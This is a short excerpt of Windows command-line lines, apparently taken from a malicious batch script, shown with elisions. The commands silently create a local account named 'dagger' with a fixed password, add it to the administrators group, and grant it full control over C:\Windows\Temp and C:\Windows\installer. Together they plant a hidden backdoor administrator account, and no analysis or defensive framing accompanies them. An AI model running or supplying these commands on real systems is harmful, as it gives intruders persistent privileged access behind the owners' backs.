...
net user dagger dagger#rdp01 /add >nul
net localgroup administrators dagger /add >nul
...
ICACLS C:\Windows\Temp /grant dagger:F >nul
ICACLS C:\Windows\installer /grant dagger:F >nul
